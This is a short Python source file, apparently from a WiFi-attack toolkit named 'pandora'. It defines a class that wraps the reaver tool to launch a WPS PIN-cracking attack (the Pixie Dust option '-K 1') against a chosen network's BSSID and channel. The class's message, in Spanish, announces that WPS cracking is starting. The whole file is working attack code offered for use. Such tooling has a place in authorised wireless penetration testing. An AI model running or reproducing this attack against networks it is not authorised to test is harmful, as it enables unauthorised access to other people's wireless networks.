# from pandora.definitions import TEMP_PATH
from pandora.config import TIMEOUT_WPS
from pandora.utils.program import ProgramBase


class Bully(ProgramBase):
    program = 'reaver'

    def bully(self, network, interface, timeout=TIMEOUT_WPS, pin=""):
        print("Comenzando cracking a WPS")

        cmd = [self.program, '-i', interface, '-c', network.get('channel'), '-b', network.get('BSSID'), '-K',
               '1', '-q', '-s', '-']

        proc = self.pcaller.runread(cmd, timeout=timeout)
        return proc[0]
